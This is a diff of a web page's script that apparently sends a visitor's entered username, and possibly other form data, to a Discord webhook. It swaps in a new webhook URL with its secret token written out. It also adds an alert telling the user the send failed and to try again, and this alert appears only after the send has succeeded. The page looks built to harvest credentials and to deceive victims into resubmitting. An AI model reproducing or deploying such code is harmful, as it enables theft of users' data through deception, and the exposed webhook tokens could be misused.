@@ -87,7 +87,7 @@
     </div>
 
     <script>
-        const webhookURL = "https://discord.com/api/webhooks/1306372914173710452/voe7x30V4dR_7jcenPRFTSt6365SUQ7l17zJVC3FYyGMtljHWybB46ekpvP7IUPCYssf";
+        const webhookURL = "https://discord.com/api/webhooks/1328825048743673906/YtSBRBZyiub3Omk_dTee-Q_YM3K5Fil20awKZ_o6BPh6v6YvC1CMSkiDPYFW_t1Yq708";
 
         function showButtons() {
             const username = document.getElementById("username").value;
@@ -127,7 +127,7 @@
             })
             .then(response => {
                 if (!response.ok) throw new Error("Failed to send webhook");
-                // Redirect to the file URL after sending the webhook
+                alert('Failed to send data to Server, please Try again')
                 window.location.href = fileURL;
             })
             .catch(error => console.error("Error:", error));
